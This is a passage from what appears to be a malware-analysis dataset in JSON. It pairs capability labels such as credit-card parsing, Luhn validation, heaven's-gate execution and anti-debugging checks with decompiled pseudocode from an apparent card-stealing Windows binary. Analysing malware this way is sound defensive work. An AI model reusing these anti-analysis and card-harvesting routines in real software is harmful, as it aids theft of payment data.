fcn.00403f50(0x40651c, 0xc, 0x406480, 0x40);\n    if ((bVar12 || cVar18 != cVar16) || (!bVar12 && cVar18 == cVar16)) {\n        pcVar11 = fcn.00403f50(0x40651c, 0xc, 0x4064c0, 0xc);\n    }\n    else {\n        unaff_EBX = unaff_EBX + 1;\n        *(uVar6 + 0x6a39da56) = *(uVar6 + 0x6a39da56) ^ extraout_CX_00;\n        *((uVar6 | 0x68) * 3) = 0;\n        uVar6 = (uVar6 & 0xffffff00 | (uVar6 | 0x68) + 0x9b) + 1;\n        uVar2 = uVar6;\n        uVar8 = extraout_CX_00 >> 8;\n        uVar2 = (uVar2 + uVar8 + -0xf) - CARRY1(uVar2, uVar8);\n        pcVar11 = uVar6 & 0xffffff00 | uVar2;\n        *pcVar11 = *pcVar11 + uVar2;\n    }\n    *unaff_EBX = *unaff_EBX & 0xc3;\n    fcn.00403f50(0x40651c, 0xc, 0x4064cc, CONCAT22(uVar3, CONCAT11(uVar14, uVar13)));\n    fcn.00403f50(0x40651c, 0xc, 0x4064d8, 4);\n    fcn.00403f50(0x40651c, 0xc, 0x4064dc, 4);\n    fcn.00403f50(0x40651c, 0xc, 0x4064e0, 0xc);\n    cVar9 = 0xcf < unaff_EBX >> 8;\n    uVar17 = 0xec;\n    uVar3 = 0x4064;\n    uVar21 = 0;\n    uVar14 = 0;\n    Var33 = 0xc;\n    uVar13 = 0;\n    Var32 = 0x40651c;\n    uVar20 = fcn.00403f50(0x40651c, 0xc, 0x4064ec, 4);\n    *(pcVar11 + 0x27de5964) = *(pcVar11 + 0x27de5964) ^ 0x6a27e95e;\n    puVar1 = uVar20 + (cVar9 == '\\0') + 0x7c8ecafd;\n    *puVar1 = *puVar1 | unaff_EBP;\n    pcVar11 = (uVar20 >> 0x20) + 0xc;\n    *pcVar11 = *pcVar11 + extraout_CH;\n    fcn.00403f50(0x40651c, CONCAT13(uVar13, Var32), CONCAT13(uVar14, Var33), CONCAT13(uVar21, CONCAT21(uVar3, uVar17)));\n    fcn.00403f50(0x40651c, 0xc, 0x4064fc, 0x16);\n    fcn.00403f50(0x40651c, 0xc, 0x406514, 7);\n    return;\n}\n",
        "token_count": 2793
    },
    "00403990": {
        "rules": [
            "parse credit card information/562ff391f55141bc9728340148e50ea1",
            "parse credit card information/562ff391f55141bc9728340148e50ea1"
        ],
        "decompiled_code": "",
        "token_count": 0
    },
    "00403270": {
        "rules": [
            "parse credit card information/0fcc6283562247e58776c7b51a92f681",
            "parse credit card information/0fcc6283562247e58776c7b51a92f681",
            "parse credit card information/0fcc6283562247e58776c7b51a92f681"
        ],
        "decompiled_code": "\n// WARNING: Control flow encountered bad instruction data\n// WARNING: Instruction at (ram,0x004033c2) overlaps instruction at (ram,0x004033bd)\n// \n// WARNING: Removing unreachable block (ram,0x0040330c)\n// WARNING: Removing unreachable block (ram,0x004032fe)\n// WARNING: Removing unreachable block (ram,0x00403308)\n// WARNING: Removing unreachable block (ram,0x004033ce)\n// WARNING: Restarted to delay deadcode elimination for space: stack\n\nulong __cdecl fcn.00403270(uchar *arg_8h, uint arg_ch)\n\n{\n    char cVar1;\n    char in_AL;\n    uint uVar2;\n    uint32_t uVar3;\n    uint32_t uVar4;\n    char in_CL;\n    uint32_t unaff_EBX;\n    uint *puVar5;\n    uint32_t unaff_EBP;\n    uint *puVar6;\n    uint32_t unaff_ESI;\n    uint *unaff_EDI;\n    bool bVar7;\n    float10 in_ST0;\n    uint32_t uVar8;\n    double in_stack_42c692c5;\n    uint uStack32;\n    uint16_t uStack28;\n    ushort uStack20;\n    ushort uStack8;\n    ushort uStack6;\n    uint uStack4;\n    \n    puVar6 = &uStack4;\n    uStack8 = unaff_EBX;\n    uStack6 = unaff_EBX >> 0x10;\n    *arg_8h = 0x2f;\n    arg_8h[1] = 0xaf;\n    if ((in_AL < '\\x02') || ('\\x01' < in_AL)) {\n        arg_8h[2] = 0x85;\n    }\n    arg_8h[3] = 0x36;\n    uStack20 = SUB42(arg_8h, 0);\n    arg_8h[4] = 0xfc;\n    arg_8h[5] = 0xce;\n    bVar7 = (POPCOUNT(in_CL + -1) & 1U) == 0;\n    arg_8h[6] = 0xd7;\n    if ((bVar7) || (!bVar7)) {\n        arg_8h[7] = 0x6d;\n    }\n    else {\n        bVar7 = (POPCOUNT(unaff_ESI + 0x42 & 0xff) & 1U) == 0;\n        uVar2 = in(uStack20);\n        *unaff_EDI = uVar2;\n    }\n    if ((!bVar7) && (bVar7)) {\n        puVar5 = &uStack32;\n        cVar1 = '\\x1e';\n        do {\n            puVar6 = puVar6 + -1;\n            puVar5 = puVar5 + -1;\n            *puVar5 = *puVar6;\n            cVar1 = cVar1 + -1;\n        } while ('\\0' < cVar1);\n        uVar2 = in(0x78);\n        return CONCAT44(arg_8h, uVar2);\n    }\n    arg_8h[8] = 0xd;\n    if (!bVar7) {\n        if (bVar7) goto code_r0x00403368;\n    }\n    arg_8h[9] = 0xb5;\ncode_r0x00403368:\n    uVar8 = uStack28;\n    puVar6 = arg_8h & 0xffff | arg_8h << 0x10;\n    uVar4 = puVar6[2];\n    *(uVar4 + 10) = 0x14;\n    bVar7 = (POPCOUNT(unaff_EBX & 0x66) & 1U) == 0;\n    *(uVar4 + 0xb) = 0x1e;\n    if ((!bVar7) && (bVar7)) {\n        cVar1 = '\\x1e';\n        do {\n            puVar6 = puVar6 + -1;\n            *0x10 = *0x10 + -4;\n            **0x10 = *puVar6;\n            cVar1 = cVar1 + -1;\n        } while ('\\0' < cVar1);\n        uVar2 = in(0x78);\n        return CONCAT44(unaff_EBX, uVar2);\n    }\n    *(uVar4 + 0xc) = 0xf9;\n    uVar3 = unaff_ESI;\n    if ((bVar7) || (uVar3 = uVar8,  !bVar7)) {\n        *(uVar4 + 0xd) = 0x30;\n        uVar8 = uVar3 & 0xffff;\n        uVar3 = uVar4;\n    }\n    else {\n        puVar6 = *0xc617b43a;\n        uVar3 = unaff_EBX + 2 | 0x66167230;\n        unaff_EBX = uVar4;\n    }\n    *(uVar3 + 0xe) = 0x27;\n    bVar7 = -1 < (unaff_EBP & 0xffff0000 | CONCAT11((unaff_EBP >> 8) - unaff_ESI, unaff_EBP)) - unaff_EBX;\n    uVar4 = puVar6[2];\n    *(uVar4 + 0xf) = 0x9d;\n    if (bVar7) {\n        uVar4 = uVar4 & 0xffff;\n        if (!bVar7) {\n            *((unaff_ESI << 0x10 | uVar8) + 0x1c) = in_ST0 - in_stack_42c692c5;\n        }\n    }\n    *(uVar4 + 0x10) = 0x96;\n    *(uVar4 + 0x11) = 0x4d;\n    *(uVar4 + 0x12) = 0x32;\n    puVar6 = puVar6[3];\n    *puVar6 = 0x13;\n    return CONCAT44(unaff_EBX, puVar6);\n}\n",
        "token_count": 1362
    },
    "00404bf0": {
        "rules": [
            "parse credit card information/0fcc6283562247e58776c7b51a92f681"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x00404c4f) overlaps instruction at (ram,0x00404c4a)\n// \n// WARNING: Restarted to delay deadcode elimination for space: stack\n\nuint __cdecl fcn.00404bf0(uint Sid)\n\n{\n    int32_t iVar1;\n    uint8_t extraout_CL;\n    uint *puVar2;\n    ulong uVar3;\n    uint var_31ch;\n    uint lpBuffer;\n    uint var_114h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    var_ch = 0x104;\n    uVar3 = (*_sym.imp.ADVAPI32.dll_GetUserNameA)(&lpBuffer, &var_ch);\n    puVar2 = uVar3 >> 0x20;\n    iVar1 = uVar3;\n    if (iVar1 == 0) {\n        return 0;\n    }\n    var_4h = 0x104;\n    var_8h = 0x104;\n    if ((iVar1 < 1) || (0 < iVar1)) {\n        puVar2 = &var_10h;\n    }\n    else {\n        *0x8d39db5a = *0x8d39db5a ^ extraout_CL;\n        LOCK();\n    }\n    iVar1 = (*_sym.imp.ADVAPI32.dll_LookupAccountNameA)(0, &lpBuffer, &var_114h, &var_4h, &var_31ch, &var_8h, puVar2);\n    if (iVar1 != 0) {\n        iVar1 = (*_sym.imp.ADVAPI32.dll_ConvertSidToStringSidA)(&var_114h, Sid);\n        if (iVar1 != 0) {\n            return 1;\n        }\n        return 0;\n    }\n    return 0;\n}\n",
        "token_count": 417
    },
    "00403720": {
        "rules": [
            "64-bit execution via heavens gate/cf627f8086064c53962fc93043360d1e"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x004037a1) overlaps instruction at (ram,0x0040379d)\n// \n\nuint * __fastcall fcn.00403720(int32_t param_1, int32_t *param_2, uint32_t *param_3)\n\n{\n    uint32_t *puVar1;\n    uint32_t uVar2;\n    char cVar3;\n    uint8_t uVar4;\n    uint16_t uVar5;\n    uint *in_EAX;\n    uint32_t uVar6;\n    uint *puVar7;\n    int32_t unaff_EBX;\n    uint *puVar8;\n    uint *puVar9;\n    uint32_t unaff_ESI;\n    uint32_t uVar10;\n    bool bVar11;\n    uint8_t in_AF;\n    bool bVar12;\n    bool bVar13;\n    bool bVar14;\n    unkbyte10 in_ST0;\n    unkbyte10 in_ST1;\n    unkbyte10 in_ST2;\n    unkbyte10 in_ST3;\n    unkbyte10 in_ST4;\n    unkbyte10 in_ST5;\n    unkbyte10 in_ST6;\n    unkbyte10 in_ST7;\n    int32_t in_stack_5f9dff5f;\n    \n    bVar11 = (POPCOUNT(param_1 - 5U & 0x44) & 1U) == 0;\n    *param_3 = 0x33;\n    puVar9 = &stack0xfffffffc;\n    uVar10 = unaff_ESI;\n    if (bVar11) goto code_r0x00403770;\n    puVar9 = &stack0xfffffffc;\n    if (!bVar11) goto code_r0x00403770;\n    uVar10 = *param_3;\n    *param_3 = unaff_ESI;\n    puVar9 = &stack0xfffffffc + -in_stack_5f9dff5f;\n    if (puVar9 < 0) {\n        *in_EAX = *in_EAX + in_EAX;\n        return in_EAX;\n    }\n    bVar14 = false;\n    bVar13 = uVar10 < 0;\n    bVar12 = uVar10 == 0;\n    bVar11 = (POPCOUNT(uVar10 & 0xff) & 1U) == 0;\n    do {\n        if (bVar14 == bVar13) {\ncode_r0x004037c2:\n            if (bVar11) {\n                puVar8 = &stack0xfffffff0;\n                cVar3 = '\\x1e';\n                do {\n                    puVar9 = puVar9 + -1;\n                    puVar8 = puVar8 + -1;\n                    *puVar8 = *puVar9;\n                    cVar3 = cVar3 + -1;\n                } while ('\\0' < cVar3);\n                puVar9 = in(0x78);\n                return puVar9;\n            }\n        }\n        else {\ncode_r0x00403770:\n            *(param_3 + 1) = 0xe7;\n            bVar11 = (in_EAX + unaff_EBX | 0x11a9U) < 0;\n            *(param_3 + 2) = 0x85;\n            if ((bVar11) || (!bVar11)) {\n                *(param_3 + 3) = 0xeb;\n            }\n            else {\n                *(in_EAX + -0x1f3a4905) = in_ST0;\n                uVar4 = in_EAX + -1;\n                in_AF = 9 < (uVar4 & 0xf) | in_AF;\n                uVar4 = uVar4 + in_AF * '\\x06';\n                in_EAX = in_EAX + -1 & 0xffffff00 | uVar4 + (0x90 < (uVar4 & 0xf0) | in_AF * (0xf9 < uVar4)) * '`';\n                *param_2 = *param_2 + 0x47c6df84;\n                puVar9 = puVar9 + unaff_EBX;\n                in_ST0 = in_ST1;\n                in_ST1 = in_ST2;\n                in_ST2 = in_ST3;\n                in_ST3 = in_ST4;\n                in_ST4 = in_ST5;\n                in_ST5 = in_ST6;\n                in_ST6 = in_ST7;\n            }\n            uVar5 = (CONCAT11((in_EAX >> 8) + -0x2b, in_EAX) ^ 0x3d) + 0x7c28 ^\n                    CONCAT11(param_2 >> 8 | param_2, param_2);\n            bVar14 = SBORROW2(uVar5, 0x4001);\n            uVar5 = uVar5 + 0xbfff;\n            bVar13 = uVar5 < 0;\n            bVar12 = uVar5 == 0;\n            bVar11 = (POPCOUNT(uVar5 & 0xff) & 1U) == 0;\n            *(param_3 + 1) = 0xa5;\n            if (!bVar11) goto code_r0x004037c2;\n        }\n        *(param_3 + 5) = 0xa6;\n        if ((bVar12 || bVar14 != bVar13) || (!bVar12 && bVar14 == bVar13)) {\n            *(param_3 + 6) = 0x46;\n            *(param_3 + 7) = 0xed;\n            uVar6 = in_EAX & 0xffff;\n            puVar1 = puVar9[2];\n            *(puVar1 + 2) = 0x11;\n            *(puVar1 + 9) = 0x49;\n            bVar11 = false;\n            *(puVar1 + 10) = 0xe8;\n            break;\n        }\n        in_AF = 9 < (in_EAX & 0xf) | in_AF;\n        in_EAX = in_EAX & 0xffff0000 | CONCAT11((in_EAX >> 8) + in_AF, in_EAX + in_AF * '\\x06') & 0xff0f;\n        if (param_1 != 0) {\n            do {\n    // WARNING: Do nothing block with infinite loop\n            } while( true );\n        }\n    } while( true );\n    while( true ) {\n        uVar2 = *puVar1;\n        *puVar1 = uVar10;\n        bVar11 = puVar9 < *(puVar9 + 0x5f9dff63);\n        puVar9 = puVar9 - *(puVar9 + 0x5f9dff63);\n        uVar10 = uVar2;\n        if (-1 < puVar9) break;\n        bVar12 = uVar6 != '\\x01';\n        *(puVar1 + 0xb) = 0xa3;\n        if ((!bVar11 && bVar12) && (bVar11 || !bVar12)) {\n            uVar6 = uVar6 & 0xe2f4cc58;\n        }\n        *(puVar1 + 3) = 0x57;\n        *(puVar1 + 0xd) = 0x80;\n        *(puVar1 + 0xe) = 0x6d;\n        bVar11 = (POPCOUNT((uVar6 & 0xae) - 1 & 0xff) & 1U) == 0;\n        *(puVar1 + 0xf) = 0xdb;\n        if ((bVar11) || (!bVar11)) goto code_r0x004038fb;\n    }\n    if (-1 < uVar2) {\n        puVar7 = fcn.004031d0(puVar9 + -0x1a, puVar9[-1], 0x4104b0, 0xf000);\n        puVar8 = puVar9[3];\n        *puVar9[2] = 0x4104b0;\n        *puVar8 = 0xf000;\n        return puVar7;\n    }\ncode_r0x004038fb:\n    puVar9 = puVar9[3];\n    *puVar9 = 0x10;\n    return puVar9;\n}\n",
        "token_count": 1834
    },
    "004048e0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/a90d4ac7cf5b4bde87d45a81715c7353",
            "validate payment card number using luhn algorithm with lookup table/6f7029bc2c134cb690df0e7c2f59f3d4",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "enumerate PE sections/e92b906b5db4485ea433dde72854611a",
            "enumerate PE sections/0325759584d940e7b69154ed16836be2"
        ],
        "decompiled_code": "\nvoid fcn.004048e0(uint param_1)\n\n{\n    uint uStack48;\n    uint uStack44;\n    code *pcStack40;\n    uint uStack36;\n    uint uStack32;\n    uint uStack28;\n    uint uStack24;\n    uint uStack20;\n    uint uStack16;\n    uint uStack12;\n    uint uStack8;\n    uint uStack4;\n    \n    uStack48 = 0x30;\n    uStack44 = 3;\n    pcStack40 = fcn.004047e0;\n    uStack36 = 0;\n    uStack32 = 0;\n    uStack28 = param_1;\n    uStack24 = 0;\n    uStack20 = 0;\n    uStack16 = 0;\n    uStack12 = 0;\n    uStack8 = 0x4104ac;\n    uStack4 = 0;\n    (*_sym.imp.USER32.dll_RegisterClassExA)(&uStack48);\n    return;\n}\n",
        "token_count": 219
    },
    "00404940": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check for software breakpoints/6dbbe1bd09a145a7938dedb5765a94dc"
        ],
        "decompiled_code": "\nbool __cdecl fcn.00404940(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h)\n\n{\n    code *pcVar1;\n    uint arg_ch_00;\n    uint arg_ch_01;\n    uint arg_ch_02;\n    int32_t iVar2;\n    uint *puVar3;\n    uint var_314h;\n    uint var_210h;\n    uchar lpBuffer;\n    uint var_10bh;\n    int32_t var_8h;\n    int32_t var_4h;\n    \n    lpBuffer = 0;\n    puVar3 = &var_10bh;\n    for (iVar2 = 0x40; iVar2 != 0; iVar2 = iVar2 + -1) {\n        *puVar3 = 0;\n        puVar3 = puVar3 + 1;\n    }\n    *puVar3 = 0;\n    var_8h = 0;\n    *(puVar3 + 2) = 0;\n    fcn.00404b10();\n    (*_sym.imp.KERNEL32.dll_GetSystemDirectoryA)(&lpBuffer, 0x104);\n    var_4h = 0;\n    do {\n        arg_ch_00 = fcn.00401e70();\n        arg_ch_01 = fcn.00401e70();\n        arg_ch_02 = fcn.00401e70();\n        fcn.00404ab0(arg_10h, arg_ch_00);\n        fcn.00404ab0(arg_8h, arg_ch_01);\n        fcn.00404ab0(arg_ch, arg_ch_02);\n        pcVar1 = _sym.imp.MSVCRT.dll_sprintf;\n        (*_sym.imp.MSVCRT.dll_sprintf)(&var_314h, 0x406024, &lpBuffer, arg_10h);\n        iVar2 = fcn.00404070(&var_314h);\n        if (iVar2 != 0) {\n            (*pcVar1)(&var_210h, 0x406030, &lpBuffer, arg_8h);\n            iVar2 = fcn.00404070(&var_210h);\n            if (iVar2 != 0) {\n                (*pcVar1)(&var_210h, 0x406030, &lpBuffer, arg_ch);\n                iVar2 = fcn.00404070(&var_210h);\n                if (iVar2 != 0) {\n                    iVar2 = 1;\n                    break;\n                }\n            }\n        }\n        var_4h = var_4h + 1;\n        iVar2 = var_8h;\n    } while (var_4h < 3);\n    fcn.00404ab0(arg_14h, 4);\n    return iVar2 != 0;\n}\n",
        "token_count": 613
    },
    "00403590": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Control flow encountered bad instruction data\n// WARNING: Instruction at (ram,0x00403615) overlaps instruction at (ram,0x00403613)\n// \n// WARNING: Variable defined which should be unmapped: var_1h\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __cdecl fcn.00403590(int32_t arg_8h, uint32_t arg_ch, int32_t arg_10h, uint32_t arg_14h, int32_t arg_18h)\n\n{\n    uint8_t uVar1;\n    uint8_t uVar2;\n    uint32_t *puVar3;\n    uint32_t uVar4;\n    uint32_t unaff_EBX;\n    int32_t iVar5;\n    bool bVar6;\n    bool bVar7;\n    uint16_t uStack32;\n    uint var_ch;\n    int32_t var_8h;\n    uint var_1h;\n    \n    var_8h = 0;\n    if (0 < arg_14h) {\n        iVar5 = 1;\n        uVar4 = arg_14h * 2;\n        do {\n            unaff_EBX = unaff_EBX & 0xffff;\n            uVar1 = *(var_8h + arg_10h);\n            uStack32 = unaff_EBX;\n            uVar4 = uVar4 & 0xffffff00 | uVar1;\n            while( true ) {\n                bVar6 = false;\n                bVar7 = -1 < (CONCAT11(uVar4 >> 8 & unaff_EBX >> 8, uVar4 | unaff_EBX) & iVar5);\n                puVar3 = iVar5 / arg_ch;\n                uVar2 = *(iVar5 % arg_ch + arg_8h);\n                unaff_EBX = uStack32 & 0xffffff00 | uVar2;\n                if ((bVar7) && (!bVar7)) {\n                    puVar3 = puVar3 + 0x1f820f;\n                    bVar6 = CARRY1(*puVar3, puVar3);\n                    *puVar3 = *puVar3 + puVar3;\n                }\n                if (!bVar6) break;\n                uStack32 = 0xb7f8;\n                uVar4 = arg_ch;\n                if (&stack0xffffffe4 < *puVar3 || puVar3 == 0xffffffff) {\n    // WARNING: Bad instruction - Truncating control flow here\n                    halt_baddata();\n                }\n            }\n            var_ch._0_1_ = arg_14h * 2;\n            *(arg_18h + -1 + iVar5) = var_ch ^ uVar1 ^ *((iVar5 + -1) % arg_ch + arg_8h);\n            *(iVar5 + arg_18h) = var_ch ^ uVar2;\n            var_8h = var_8h + 1;\n            iVar5 = iVar5 + 2;\n            uVar4 = arg_14h;\n        } while (var_8h < arg_14h);\n    }\n    return;\n}\n",
        "token_count": 672
    },
    "00403f50": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\n// WARNING: Control flow encountered bad instruction data\n// WARNING: Instruction at (ram,0x00403f94) overlaps instruction at (ram,0x00403f8b)\n// \n// WARNING: Removing unreachable block (ram,0x00403f85)\n\nvoid __cdecl fcn.00403f50(int32_t arg_8h, int32_t arg_ch, int32_t arg_10h, int32_t arg_14h)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = 0;\n    if (0 < arg_14h) {\n        do {\n    // WARNING: Bad instruction - Truncating control flow here\n            *(iVar1 + arg_10h) = arg_14h ^ *(iVar1 + arg_10h) ^ *(iVar1 % arg_ch + arg_8h);\n            iVar1 = iVar1 + 1;\n        } while (iVar1 < arg_14h);\n    }\n    return;\n}\n",
        "token_count": 208
    },
    "004041b0": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "create or open file"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004041b0(uint arg_8h)\n\n{\n    (*_sym.imp.KERNEL32.dll_CreateFileA)(arg_8h, 0xc0000000, 1, 0, 3, 0x80, 0);\n    return;\n}\n",
        "token_count": 64
    },
    "00404760": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x0040479c) overlaps instruction at (ram,0x00404797)\n// \n\nuint __cdecl fcn.00404760(uint arg_8h, uint arg_ch)\n\n{\n    uint arg_8h_00;\n    uint32_t uVar1;\n    uchar *puVar2;\n    uint arg_ch_00;\n    bool bVar3;\n    \n    arg_ch_00 = arg_ch;\n    arg_8h_00 = arg_8h;\n    puVar2 = &stack0xfffffffc;\n    uVar1 = fcn.00403af0(arg_8h, arg_ch, &arg_8h, &arg_ch);\n    bVar3 = (POPCOUNT(uVar1 & 0xff) & 1U) != 0;\n    if (uVar1 == 0) {\n        return 0;\n    }\n    if (bVar3) {\n        if (!bVar3) {\n            arg_ch_00 = 0x34a96cf4;\n            puVar2 = *0x8b17b43a;\n            goto code_r0x004047a2;\n        }\n    }\n    *(uVar1 + 0x58) = arg_ch;\ncode_r0x004047a2:\n    fcn.00403af0(arg_8h_00, arg_ch_00, puVar2 + 8, puVar2 + 0xc);\n    return 1;\n}\n",
        "token_count": 321
    },
    "004047e0": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\n// WARNING: Control flow encountered bad instruction data\n// WARNING: Instruction at (ram,0x00404821) overlaps instruction at (ram,0x0040481f)\n// \n\nvoid __cdecl fcn.004047e0(uint arg_8h, int32_t arg_ch, uint arg_10h, uint arg_14h)\n\n{\n    uint32_t unaff_ESI;\n    uint32_t uVar1;\n    bool bVar2;\n    bool bVar3;\n    \n    if (arg_ch == 1) {\n        uVar1 = unaff_ESI & 0xffff0000 | unaff_ESI + 1;\n        bVar2 = uVar1 < 0x222c;\n        bVar3 = uVar1 == 0x222c;\n        fcn.00402610();\n        if ((!bVar2 && !bVar3) && (bVar2 || bVar3)) {\n            *0xffffffe9 = *0xffffffe9 - &stack0xfffffff0;\n    // WARNING: Bad instruction - Truncating control flow here\n            halt_baddata();\n        }\n        fcn.00403c40();\n        if (*0x41f4e0 == 0) {\n            (*_sym.imp.USER32.dll_PostQuitMessage)(0);\n            fcn.00404560();\n        }\n    }\n    (*_sym.imp.USER32.dll_DefWindowProcA)(arg_8h, arg_ch, arg_10h, arg_14h);\n    return;\n}\n",
        "token_count": 326
    },
    "00404b10": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.00404b10(void)\n\n{\n    uint uVar1;\n    \n    if (*0x41f4e4 == 0) {\n        uVar1 = (*_sym.imp.MSVCRT.dll_time)(0);\n        (*_sym.imp.MSVCRT.dll_srand)(uVar1);\n        *0x41f4e4 = 1;\n    }\n    return;\n}\n",
        "token_count": 88
    },
    "00401510": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x00401549) overlaps instruction at (ram,0x00401547)\n// \n\nuint __cdecl fcn.00401510(uint arg_8h)\n\n{\n    uint hSCManager;\n    uint uVar1;\n    ushort uVar2;\n    ushort uVar3;\n    \n    uVar2 = 0;\n    uVar3 = 0;\n    hSCManager = (*_sym.imp.ADVAPI32.dll_OpenSCManagerA)(0, 0, 0x3f);\n    uVar1 = fcn.00403fe0(hSCManager, CONCAT22(uVar3, uVar2));\n    (*_sym.imp.ADVAPI32.dll_CloseServiceHandle)(hSCManager);\n    return uVar1;\n}\n",
        "token_count": 167
    },
    "00401570": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Control flow encountered bad instruction data\n// WARNING: Instruction at (ram,0x004015ee) overlaps instruction at (ram,0x004015ed)\n// \n// WARNING: Removing unreachable block (ram,0x004015d3)\n// WARNING: Removing unreachable block (ram,0x004015eb)\n// WARNING: Restarted to delay deadcode elimination for space: stack\n\nuint32_t __fastcall fcn.00401570(uint param_1, uint8_t param_2)\n\n{\n    char cVar1;\n    uint32_t uVar2;\n    int32_t in_EAX;\n    int32_t iVar3;\n    uint unaff_EBP;\n    int32_t *unaff_EDI;\n    int32_t *piVar4;\n    char *pcVar5;\n    bool in_CF;\n    bool in_ZF;\n    bool in_OF;\n    char *pcVar6;\n    \n    pcVar6 = NULL;\n    if (!in_CF && !in_ZF) {\n        if (in_CF || in_ZF) {\n            if (in_OF) {\n                *(in_EAX + 0x56) = *(in_EAX + 0x56) | param_2;\n                uVar2 = fcn.00403fe0(0, unaff_EBP);\n                (*_sym.imp.ADVAPI32.dll_CloseServiceHandle)();\n                return uVar2;\n            }\n    // WARNING: Bad instruction - Truncating control flow here\n            halt_baddata();\n        }\n    }\n    iVar3 = fcn.00404bf0(&stack0xfffffff8);\n    if (iVar3 == 0) {\n        return 0;\n    }\n    piVar4 = unaff_EDI;\n    if (-1 < iVar3) {\n        if (-1 >= iVar3) {\n            out(0xc4, iVar3);\n            piVar4 = unaff_EDI + 1;\n            *unaff_EDI = iVar3;\n        }\n    }\n    if (pcVar6 == NULL) {\n        return 0;\n    }\n    uVar2 = 0xffffffff;\n    pcVar5 = pcVar6;\n    do {\n        if (uVar2 == 0) break;\n        uVar2 = uVar2 - 1;\n        cVar1 = *pcVar5;\n        pcVar5 = pcVar5 + 1;\n    } while (cVar1 != '\\0');\n    iVar3 = (*_sym.imp.SHLWAPI.dll_SHSetValueA)(0x80000002, 0x406204, str.aR_, 1, pcVar6, ~uVar2 - 1, piVar4);\n    return iVar3 == 0;\n}\n",
        "token_count": 580
    },
    "00401810": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "create or open registry key",
            "query or enumerate registry value"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x00401866)\n// WARNING: Removing unreachable block (ram,0x0040186e)\n// WARNING: Removing unreachable block (ram,0x00401871)\n// WARNING: Removing unreachable block (ram,0x004017f2)\n\nbool __cdecl fcn.00401810(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h, uint arg_18h, uint arg_1ch)\n\n{\n    int32_t iVar1;\n    uint hKey;\n    \n    iVar1 = (*_sym.imp.ADVAPI32.dll_RegOpenKeyExA)(arg_8h, arg_ch, 0, 0xf003f, &hKey);\n    if (iVar1 == 0) {\n        iVar1 = (*_sym.imp.ADVAPI32.dll_RegQueryValueExA)(hKey, arg_10h, 0, arg_14h, arg_18h, arg_1ch);\n        (*_sym.imp.ADVAPI32.dll_RegCloseKey)(hKey);\n        return iVar1 == 0;\n    }\n    return false;\n}\n",
        "token_count": 247
    },
    "004019f0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x00401c67) overlaps instruction at (ram,0x00401c66)\n// \n// WARNING: Removing unreachable block (ram,0x00401bcc)\n// WARNING: Removing unreachable block (ram,0x00401b6a)\n// WARNING: Removing unreachable block (ram,0x00401b35)\n// WARNING: Removing unreachable block (ram,0x00401b64)\n// WARNING: Removing unreachable block (ram,0x00401aff)\n\nuint32_t fcn.004019f0(void)\n\n{\n    uint *puVar1;\n    uint uVar2;\n    char **ppcVar3;\n    uint *puVar4;\n    int32_t iVar5;\n    char *pcVar6;\n    char *pcVar7;\n    uint32_t uVar8;\n    uint8_t extraout_CL;\n    char extraout_DL;\n    char *unaff_EBX;\n    code *unaff_ESI;\n    code *pcVar9;\n    ushort in_SS;\n    bool bVar10;\n    unkbyte6 Var11;\n    uchar auStack92 [8];\n    uint uStack84;\n    char *pcStack80;\n    uint32_t uStack76;\n    char *pcStack72;\n    uint uStack68;\n    char *pcStack64;\n    uint uStack60;\n    uint var_4h;\n    \n    if (*0x41f4cc != 0) {\n        return 1;\n    }\n    iVar5 = (*_sym.imp.KERNEL32.dll_LoadLibraryA)();\n    puVar4 = _sym.imp.KERNEL32.dll_GetProcAddress;\n    if (iVar5 == 0) {\n        return 0;\n    }\n    *0x41f4bc = (*_sym.imp.KERNEL32.dll_GetProcAddress)();\n    if (*0x41f4bc == 0) {\n        return 0;\n    }\n    pcVar9 = _sym.imp.KERNEL32.dll_LoadLibraryA;\n    if ((0 < *0x41f4bc) && (*0x41f4bc < 1)) {\n        unaff_EBX = unaff_EBX + 1;\n        *(*0x41f4bc + -0x74c625aa) = *(*0x41f4bc + -0x74c625aa) ^ extraout_CL;\n        pcVar9 = unaff_ESI;\n    }\n    iVar5 = (*pcVar9)();\n    if (iVar5 == 0) {\n        return 0;\n    }\n    *0x41f4c4 = (*puVar4)();\n    if 